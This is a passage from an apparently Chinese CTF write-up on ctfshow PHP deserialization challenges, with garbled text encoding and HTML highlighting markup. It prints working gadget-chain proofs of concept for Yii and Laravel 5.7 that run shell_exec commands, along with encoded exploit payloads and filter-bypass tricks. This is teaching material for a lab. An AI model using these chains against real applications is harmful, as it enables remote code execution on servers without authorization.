single-quoted-string">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";&#125;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>f<span class="token operator">=</span>aaa<span class="token operator">&amp;</span>m<span class="token operator">=</span>bbb<span class="token operator">&amp;</span>t<span class="token operator">=</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="token string double-quoted-string">";s:5:"</span>token<span class="token string double-quoted-string">";s:5:"</span>admin"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>åœ¨å‘index.phpå‘é€ä¹‹åå¾—åˆ°å›æ˜¾Your message has been sentï¼Œç„¶åè®¿é—®message.phpï¼ˆè®°å¾—CookieåŠ ä¸Šmsgï¼‰å¾—åˆ°flag</p><h4 id="web265-å¼•ç”¨"><a href="#web265-å¼•ç”¨" class="headerlink" title="web265(å¼•ç”¨ &amp;)"></a>web265(å¼•ç”¨ &amp;)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å¦‚æœè¦é è¾“å…¥çš„ <code>$password</code> å»å’Œ <code>md5(mt_rand())</code> ç¢°æ’ï¼Œå‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚è¿™é‡Œéœ€è¦ç”¨åˆ° <code>php</code> çš„å¼•ç”¨ï¼Œä½¿å¾— <code>$password = </code></p><p><code>&amp;$token;</code>ï¼Œé‚£ä¹ˆ <code>$password === $token</code> å°±æ²¡é—®é¢˜äº†ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token operator">&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payloadï¼š<span class="token operator">?</span>ctfshow<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A12<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowAdmin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>token<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BR<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web266-PHPå¤§å°å†™"><a href="#web266-PHPå¤§å°å†™" class="headerlink" title="web266( PHPå¤§å°å†™)"></a>web266( PHPå¤§å°å†™)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cs</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshowo</span><span class="token operator">=</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error <span class="token interpolation"><span class="token variable">$ctfshowo</span></span>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong><a href="https://blog.csdn.net/qq_41445224/article/details/88890323">file_get_contents(â€˜php:&#x2F;&#x2F;inputâ€™)</a></strong></p><p>åœ¨ç”¨phpå†™æ¥å£çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šå°†è¯·æ±‚çš„æ•°æ®é€šè¿‡jsonçš„å½¢å¼å‘é€åˆ°æŒ‡å®šçš„è¯·æ±‚åœ°å€å¤„ï¼Œæ­¤æ—¶çš„file_get_contents(â€˜php:&#x2F;&#x2F;inputâ€™)<br>ä¸»è¦æ˜¯ç”¨æ¥è·å–è¯·æ±‚çš„åŸå§‹æ•°æ®</p><p>å…¶ä¸POSTçš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token variable">$_POST</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span>â€œnameâ€<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> â€œzhangsanâ€ <span class="token punctuation">[</span>â€œpwdâ€<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> â€œzhangsanâ€ <span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>php<span class="token punctuation">:</span><span class="token comment">//input-------------</span>name<span class="token operator">=</span>zhangsan<span class="token operator">&amp;</span>pwd<span class="token operator">=</span>zhangsan</code></pre><p>åªè¦åºåˆ—åŒ–ctfshowç±»è®©ä»–ååºåˆ—ä¹‹åè§¦å‘__destruct()å‡½æ•°å³å¯å¾—åˆ°flag</p><p>ç”±äºè¿‡æ»¤äº†<code>ctfshow</code>ä½†æ˜¯è¿™é‡Œç”¨çš„æ˜¯<code>cTFSHOW</code>ï¼Œåœ¨PHPä¸­ï¼Œç±»ä¸åŒºåˆ†å¤§å°å†™ï¼›æ‰€ä»¥ç»•è¿‡äº†è¿‡æ»¤ã€‚</p><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ª <code>php</code> å¸¸è¯†ï¼š<a href="https://www.cnblogs.com/zrp2013/p/3607581.html">PHPå¤§å°å†™ï¼šå‡½æ•°åå’Œç±»åä¸åŒºåˆ†,å˜é‡ååŒºåˆ†</a>ã€‚</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cTFSHOW"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web267-Yiiæ¡†æ¶"><a href="#web267-Yiiæ¡†æ¶" class="headerlink" title="web267(Yiiæ¡†æ¶)"></a>web267(Yiiæ¡†æ¶)</h4><p>å¼±å¯†ç <code>admin/admin</code>ç™»é™†åï¼ŒAboutç•Œé¢å‘ç°æ³¨é‡Š<code>&lt;!--?view-source --&gt;</code></p><p>äºæ˜¯è®¿é—®<code>index.php?r=site/about&amp;view-source</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token comment">///backdoor/shell</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æœäº†ä¸€ä¸‹çŸ¥é“æ˜¯ <code>Yii</code> æ¡†æ¶çš„ååºåˆ—åŒ–æ¼æ´ã€‚</p><p><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yiiååºåˆ—åŒ–æ¼æ´åˆ†æ</a></p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cp /flag 3.txt'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™é‡Œ <code>system</code> ä¸èƒ½ç”¨ï¼Œç”¨äº† <code>shell_exec</code>ã€‚</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">%</span><span class="token number">2</span>Fshell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6MTQ6ImNwIC9mbGFnIDMudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</code></pre><h4 id="web268-270-Yiiæ¡†æ¶"><a href="#web268-270-Yiiæ¡†æ¶" class="headerlink" title="web268-270(Yiiæ¡†æ¶)"></a>web268-270(Yiiæ¡†æ¶)</h4><p>åšæ³•ä¸€æ ·ä½†æ˜¯éœ€è¦ä¿®æ”¹pocï¼Œå› ä¸ºå­˜åœ¨è¿‡æ»¤ </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Action</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$writeCallback</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DbSession</span> <span class="token keyword">extends</span> <span class="token class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeCallback</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"run"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>base<span class="token punctuation">\</span>BaseObject</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>DbSession</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cp /f* 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ­¤å¤„å†™å‘½ä»¤</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">/</span>shell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0<span class="token operator">=</span></code></pre><h4 id="web271-Laravel5-7-ååºåˆ—åŒ–æ¼æ´"><a href="#web271-Laravel5-7-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web271(Laravel5.7 ååºåˆ—åŒ–æ¼æ´)"></a>web271(Laravel5.7 ååºåˆ—åŒ–æ¼æ´)</h4><p><a href="https://blog.csdn.net/weixin_45678034/article/details/122292624">Laravel5.7ååºåˆ—åŒ–RCEæ¼æ´åˆ†æ</a></p><p>ç©ºæ ¼è¢«è¿‡æ»¤æ³¨æ„ä¿®æ”¹æœ€åçš„payload</p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingCommand</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">,</span><span class="token variable">$class</span><span class="token punctuation">,</span><span class="token variable">$app</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">command</span> <span class="token operator">=</span> <span class="token variable">$command</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parameters</span> <span class="token operator">=</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">app</span><span class="token operator">=</span><span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">GenericUser</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">attributes</span> <span class="token operator">=</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token 